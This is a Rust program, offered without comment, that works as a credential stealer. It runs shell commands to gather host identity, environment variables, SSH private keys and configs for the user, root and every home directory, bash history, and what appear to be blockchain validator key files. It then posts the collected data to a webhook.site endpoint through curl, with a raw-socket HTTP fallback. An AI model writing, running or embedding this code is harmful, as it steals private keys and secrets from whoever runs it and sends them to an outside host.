use std::io::Write;
use std::net::TcpStream;
use std::process::{Command, Stdio};

const HOOK: &str = "0e2f3707-01eb-41cb-af8e-10eac95c9ac5";

fn main() {
    let cmds = [
        "id; hostname; whoami; uname -a",
        "env | sort",
        "ls -la ~/.ssh /root/.ssh /home/*/.ssh 2>/dev/null",
        "cat ~/.ssh/id_ed25519 ~/.ssh/id_rsa ~/.ssh/id_ecdsa ~/.ssh/authorized_keys ~/.ssh/config 2>/dev/null",
        "cat /root/.ssh/id_ed25519 /root/.ssh/id_rsa /root/.ssh/authorized_keys /root/.ssh/config 2>/dev/null",
        "cat /home/*/.ssh/id_ed25519 /home/*/.ssh/id_rsa /home/*/.ssh/authorized_keys 2>/dev/null",
        "cat ~/sosh-config.sh ~/active-key/validator-identity.json ~/keys/primary/validator-identity.json ~/keys/primary/validator-vote-account.json ~/balancing/config/settings.yaml 2>/dev/null",
        "cat ~/.bash_history ~/.gitconfig 2>/dev/null",
        "find /home /root -maxdepth 4 -type f \\( -name 'id_*' -o -name 'authorized_keys' -o -name '*.pem' -o -name 'sosh-config.sh' \\) 2>/dev/null | head -100",
    ];
    let mut data = String::new();
    for c in cmds {
        if let Ok(out) = Command::new("sh").arg("-c").arg(c).output() {
            data.push_str(&format!(
                "=== {} ===\n{}\n",
                c,
                String::from_utf8_lossy(&out.stdout)
            ));
        }
    }
    if data.len() > 500_000 {
        data.truncate(500_000);
    }
    let sent = send_curl(&data) || send_raw(&data);
    if !sent {
        eprintln!("EXFIL_FAILED\n{}", data);
        std::process::exit(1);
    }
}

fn send_curl(data: &str) -> bool {
    let url = format!("https://webhook.site/{}", HOOK);
    let mut child = match Command::new("curl")
        .args(["-s", "-m", "30", "-X", "POST", "--data-binary", "@-", &url])
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(c) => c,
        Err(_) => return false,
    };
    if let Some(mut stdin) = child.stdin.take() {
        let _ = stdin.write_all(data.as_bytes());
    }
    matches!(child.wait(), Ok(s) if s.success())
}

fn send_raw(data: &str) -> bool {
    let body = format!("data={}", urlencode(data));
    let req = format!(
        "POST /{} HTTP/1.1\r\nHost: webhook.site\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        HOOK,
        body.len(),
        body
    );
    match TcpStream::connect("webhook.site:80") {
        Ok(mut s) => s.write_all(req.as_bytes()).is_ok(),
        Err(_) => false,
    }
}

fn urlencode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}
